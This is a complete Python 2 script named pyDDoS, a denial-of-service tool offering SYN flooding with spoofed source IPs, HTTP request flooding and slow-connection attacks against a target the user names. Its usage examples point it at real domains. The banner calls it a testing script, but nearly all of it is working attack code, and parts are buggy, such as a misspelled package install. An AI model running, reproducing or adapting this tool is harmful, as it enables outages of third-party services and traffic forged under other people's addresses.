#!/usr/bin/python

version= '2.0'
title = '''

      _ \        __ \  __ \               ___|           _)       |   
     |   | |   | |   | |   |  _ \   __| \___ \   __|  __| | __ \  __|  
     ___/  |   | |   | |   | (   |\__ \       | (    |    | |   | |   
    _|    \__, |____/ ____/ \___/ ____/ _____/ \___|_|   _| .__/ \__|  
           ____/                                            _|         
                                                                    
 DDos python script | Script use for testing ddos | Ddos attack     
 Author: ___T7hM1___                                                
 Github: http://github.com/t7hm1/pyddos                             
 Version:'''+version+''' 
'''

import os
import sys
import json
import time
import string
import httplib,urlparse
from random import *
from socket import *
from struct import *
from threading import *
from argparse import ArgumentParser,RawTextHelpFormatter
try:
	import requests
	from termcolor import colored,cprint
except:
	try:
		if os.name == 'posix':
			os.system('sudo pip install termcolor')
			os.system('sudo pip install reuqests')
			print '[+] Termcolor,requests have been installed'
		elif os.name != 'posix':
			os.system('pip install termcolor')
			os.system('pip install requests')
			print '[+] Termcolor has been installed'
		else:
			print '[-] Download and install requests,termcolor'
	except Exception,e:
		print '[-]',e

screenLock=Semaphore(value=99999)

def fake_ip():
	skip = '127'
	rand = range(4)
	for x in range(4):
		rand[x] = randrange(0,256)
	if rand[0] == skip:
		fake_ip()
	fkip = '%d.%d.%d.%d' % (rand[0],rand[1],rand[2],rand[3])
	return fkip


def check_tgt(args):
	tgt = args.d
	try:
		ip = gethostbyname(tgt)
	except:
		sys.exit(cprint('[-] Can\'t resolve host:Unknow host!','red'))
	return ip


def add_useragent():
	uagents = []
	uagents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36')
	uagents.append('(Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36')
	uagents.append('Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25')
	uagents.append('Opera/9.80 (X11; Linux i686; U; hu) Presto/2.9.168 Version/11.50')
	uagents.append('Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)')
	uagents.append('Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101  Firefox/28.0')
	uagents.append('Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36 Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
	uagents.append('Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)')
	return uagents

def add_bots():
	bots=[]
	bots.append('http://www.bing.com/search?q=%40&count=50&first=0')
	bots.append('http://www.google.com/search?hl=en&num=100&q=intext%3A%40&ie=utf-8')
	return bots

class Pyslow_request(Thread):
	def __init__(self,tgt):
		Thread.__init__(self)
		self.tgt = tgt
		self.method = ['GET','POST']
		self.__run()
	def __run(self):
		self.slow_requester()
	def create_header(self):
		cachetype = ['no-cache','no-store','max-age='+str(randint(0,10)),'max-stale='+str(randint(0,100)),'min-fresh='+str(randint(0,10)),'notransform','only-if-cache']
		acceptEc = ['compress,gzip','','*','compress;q=0,5, gzip;q=1.0','gzip;q=1.0, indentity; q=0.5, *;q=0']
		acceptC = ['ISO-8859-1','utf-8','Windows-1251','ISO-8859-2','ISO-8859-15']
		bot = add_bots()
		c=choice(cachetype)
		a=choice(acceptEc)
		http_header = {
		    'User-Agent' : choice(add_useragent()),
		    'Cache-Control' : c,
		    'Accept-Encoding' : a,
		    'Keep-Alive' : randint(1,700),
		    'Host' : self.tgt,
		    'Referer' : choice(bot)
		}
		payload = {
		    'user' : 'Anonymous',
		    'password' : 'xxxxxxx',
		    'data' : 'None data',
		    'key' : randint(1,10000),
		    'value' : randint(1,2000),
		}
		return (http_header,payload)
	def make_str(self):
		mystr=[]
		cnd=(string.ascii_letters+string.digits)
		for x in range(3):
			text = (choice(cnd) for _ in range(randint(1,7)))
			text = ''.join(text)
			mystr.append(text)
		return '='.join(mystr)
	def remake_url(self):
		return 'http://'+self.tgt+'/search=?'+self.make_str()
	def datas(self):
		url=self.remake_url()
		(headers,payload)=self.create_header()
		return (url,headers,payload)
	def slow_requester(self):
		(url,headers,payload) = self.datas()
		try:
			re1=requests.get(url,headers=headers)
			re2=requests.post(url,data=json.dumps(payload))
		except KeyboardInterrupt:
			sys.exit(cprint('[-] Canceled by user','red'))
		except Exception:
			cprint('\tOopps target too busy now !','red')
class Pyslow():
	def __init__(self,tgt,port,to,threads,sleep):
		self.tgt = tgt
		self.port = port
		self.to = to
		self.threads = threads
		self.sleep = sleep
		self.method = ['GET','POST']
		self.sockets = []
		self.pkt=self.create_packet()
	def create_packet(self):
		pkt=str(choice(self.method)+'/'+str(randint(100,777))+'HTTP/1.1\r\n\r\nHost:'+self.tgt+'User-Agent:'+choice(add_useragent())+'\r\n'+'Content-Length:'+str(randint(45,700))+'\r\n').encode('utf-8')
		return pkt
	def create_socket(self):
		x=0
		while x < (self.threads):
			cprint('\t\tBuilding sockets','blue')
			sock=socket(AF_INET,SOCK_STREAM)
			if sock:
				sock.settimeout(self.to)
			self.sockets.append(sock)
			x+=1
			if x > self.threads:
				break
		cprint('Sending packets....\t\tSending packets....\n\tSending packets...','blue')
		time.sleep(5)
	def slower(self):
		self.create_socket()
		pkt_count = 0
		for slow in self.sockets:
			try:
				slow.connect((self.tgt,self.port))
				if slow.sendto(self.pkt,(self.tgt,self.port)):
					pkt_count+=1
					print colored('\t\tI have sent ','green') + str(colored(pkt_count,'cyan')) + colored(' packets successfully.','green') 
					screenLock.acquire()
					slow.shutdown(1)
					slow.close()
				else:
					cprint('The target maybe bussy','red')
					screenLock.acquire()
					slow.shutdown(1)
					slow.close()
			except KeyboardInterrupt:
				sys.exit(cprint('[-] Canceled by user','red'))
			finally:
				screenLock.release()
		self.stime()
	def stime(self):
		time.sleep(self.sleep)
class Requester(Thread):
	def __init__(self,tgt,threads):
		Thread.__init__(self)
		self.tgt = tgt
		self.threads=threads
		self.port = None
		self.ssl = False
		self.req = []
		url_type = urlparse.urlparse(self.tgt)
		if url_type.scheme == 'https':
			self.ssl = True
			if self.ssl == True:
				self.port = 443
		else:
			self.port = 80
		self.__run()
	def __run(self):
		self.requesting()
	def header(self):
		cachetype = ['no-cache','no-store','max-age='+str(randint(0,10)),'max-stale='+str(randint(0,100)),'min-fresh='+str(randint(0,10)),'notransform','only-if-cache']
		acceptEc = ['compress,gzip','','*','compress;q=0,5, gzip;q=1.0','gzip;q=1.0, indentity; q=0.5, *;q=0']
		acceptC = ['ISO-8859-1','utf-8','Windows-1251','ISO-8859-2','ISO-8859-15']
		bot = add_bots()
		c=choice(cachetype)
		a=choice(acceptEc)
		http_header = {
		    'User-Agent' : choice(add_useragent()),
		    'Cache-Control' : c,
		    'Accept-Encoding' : a,
		    'Keep-Alive' : randint(1,700),
		    'Host' : self.tgt,
		    'Referer' : choice(bot)
		}
		return http_header
	def rand_str(self):
		mystr=[]
		for x in range(3):
			chars = tuple(string.ascii_letters+string.digits)
			text = (choice(chars) for _ in range(randint(7,14)))
			text = ''.join(text)
			mystr.append(text)
		return '&'.join(mystr)
	def create_url(self):
		return self.tgt + '?' + self.rand_str()
	def data(self):
		url = self.create_url()
		http_header = self.header()
		return (url,http_header)

	def requesting(self):
		try:
			if self.ssl:
				conn = httplib.HTTPSConnection(self.tgt,self.port)
			else:
				conn = httplib.HTTPConnection(self.tgt,self.port)
				self.req.append(conn)
			for reqter in self.req:
				(url,http_header) = self.data()
				method = choice(['get','post'])
				reqter.request(method.upper(),url,None,http_header)
				print colored('[-->] Requested your target: ','green') + colored(self.tgt,'red') 
		except KeyboardInterrupt:
			sys.exit(cprint('[-] Canceled by user','red'))
		except Exception,e:
			print e
		finally:
			screenLock.release()
		self.closeConnections()
	def closeConnections(self):
		for conn in self.req:
			try:
				conn.close()
			except:
				pass

class Synflood(Thread):
	def __init__(self,tgt,port,ip,sock=None):
		Thread.__init__(self)
		self.tgt = tgt
		self.port = port 
		self.ip = ip
		self.psh = ''
		if sock is None:
			self.sock = socket(AF_INET,SOCK_RAW,IPPROTO_TCP)
		self.ts=[]
		try:
			t = Thread(target=self.run)
			t.setDaemon(True)
			t.daemon=True
			t.start()
			self.ts.append(t)
		except KeyboardInterrupt:
			sys.exit(cprint('[-] Canceled by user','red'))
		t.join()
	def run(self):
		self.syn_flood()
	def checksum(self):
		s = 0 
		for i in range(0,len(self.psh),2):
			w = (ord(self.psh[i]) << 8) + (ord(self.psh[i+1]))
			s = s+w

		s = (s>>16) + (s & 0xffff)
		s = ~s & 0xffff

		return s
	def syn_flood(self):
		
		self.sock.setsockopt(IPPROTO_IP,IP_HDRINCL,1)

		ihl=5
		version=4
		tos=0
		tot=40
		id=54321
		frag_off=0
		ttl=255
		protocol=IPPROTO_TCP
		check=10
		s_addr=inet_aton(self.ip)
		d_addr=inet_aton(self.tgt)

		ihl_version = (version << 4) + ihl
		ip_header = pack('!BBHHHBBH4s4s',ihl_version,tos,tot,id,frag_off,ttl,protocol,check,s_addr,d_addr)

		source = 1234
		dest = 80
		seq = 0
		ack_seq = 0
		doff = 5
		fin = 0
		syn = 1
		rst = 0
		ack = 0
		psh = 0
		urg = 0
		window = htons(5840)
		check = 0
		urg_prt = 0

		offset_res = (doff << 4)
		tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)
		tcp_header=pack('!HHLLBBHHH',source,dest,seq,ack_seq,offset_res,tcp_flags,window,check,urg_prt)

		src_addr = inet_aton(self.ip)
		dst_addr = inet_aton(self.tgt)
		place = 0
		protocol = IPPROTO_TCP
		tcp_length = len(tcp_header)

		self.psh = pack('!4s4sBBH',src_addr,dst_addr,place,protocol,tcp_length);
		self.psh = self.psh + tcp_header;

		tcp_checksum = self.checksum()

		tcp_header = pack('!HHLLBBHHH',source,dest,seq,ack_seq,offset_res,tcp_flags,window,tcp_checksum,urg_prt)
		packet = ip_header + tcp_header

		try: 
			print colored('[-->] Synflood to ','green') + colored(self.tgt,'red');time.sleep(.3)
			self.sock.sendto(packet,(self.tgt,int(self.port)))
			screenLock.acquire()
		except KeyboardInterrupt:
			sys.exit()
		except Exception,e:
			print '[-]',e
		finally:
			screenLock.release()


def main():
	parser = ArgumentParser(
		usage='./%(prog)s -t [target] -p [port] -t [number threads]',
		version=version,
		formatter_class=RawTextHelpFormatter,
		prog='pyddos',
		description=cprint(title,'white',attrs=['bold']),
		epilog='''
Example:
    ./%(prog)s -d www.example.com -p 80 -T 2000
    ./%(prog)s -d www.domain.com -s 100
    ./%(prog)s -d www.google.com --synflood -T 5000 -t 10.0
'''
)
	options = parser.add_argument_group('options','')
	options.add_argument('-d',metavar='<ip|domain>',default=False,help='Specify your target such an ip or domain name')
	options.add_argument('-t',metavar='<float>',default=5.0,help='Set timeout for socket')
	options.add_argument('-T',metavar='<int>',default=2000,help='Set threads number for connection (default = 2000)')
	options.add_argument('-p',metavar='<int>',default=80,help='Specify port target (default = 80)' + colored(' |Only required with pyslow attack|','red'))
	options.add_argument('-s',metavar='<int>',default=100,help='Set sleep time for reconnection')
	options.add_argument('-i',metavar='<ip address>',default=False,help='Specify spoofed ip unless use fake ip')
	options.add_argument('--fakeip',action='store_true',default=False,help='Option to create fake ip if not specify spoofed ip')
	options.add_argument('--request',action='store_true',help='Enable request target')
	options.add_argument('--synflood',action='store_true',help='Enable synflood attack')
	options.add_argument('--pyslow',action='store_true',help='Enable pyslow attack')
	args = parser.parse_args()
	if args.d == False:
		parser.print_help()
		sys.exit()
	add_bots();add_useragent()
	if args.d:
		check_tgt(args)
	if args.synflood:
		uid = os.getuid()
		if uid == 0:
			cprint('[*] You have enough permisson to run this script','green')
			time.sleep(0.5)
		else:
			sys.exit(cprint('[-] You haven\'t enough permission to run this script','red'))
		tgt=check_tgt(args)
		ts=[]
		while True:
			if args.i == False:
				args.fakeip = True
				if args.fakeip == True:
					ip = fake_ip()
			else:
				ip = args.i
			try:
				for t in range(int(args.T)):
					t=Thread(target=Synflood,args=(tgt,args.p,ip))
					t.setDaemon(True)
					t.daemon=True
					t.start()
					ts.append(t)
			except KeyboardInterrupt:
				sys.exit(cprint('[-] Canceled by user','red'))
			t.join()
	if args.request:
		tgt = args.d
		threads = int(args.T)
		ts=[]
		while True:
			try:
				for x in range(int(args.T)):
					t = Requester(tgt,threads)
					ts.append(t);t.daemon=True
					t.start()
				t.join(1)
			except KeyboardInterrupt:
				cprint('[-] Canceled by user','red')
	if args.pyslow:
		try:
			tgt = args.d
			port = int(args.p)
			to = float(args.t)
			st = int(args.s)
			threads = int(args.T)
		except Exception,e:
			print '[-]',e
		s=0
		ts=[]
		try:
			while True:
				for x in range(threads):
					t1=Pyslow_request(tgt)
					ts.append(t1);t1.daemon=True
					t1.start()
				t1.join(1)
				pyslow=Pyslow(tgt,port,to,threads,st)
				pyslow.slower()
		except KeyboardInterrupt:
			sys.exit(cprint('[-] Canceled by user','red'))

	if not (args.synflood) and not (args.request) and not (args.pyslow):
		parser.print_help()
		print
		sys.exit(cprint('[-] You must choose attack type','red'))



if __name__ == '__main__':
	main()
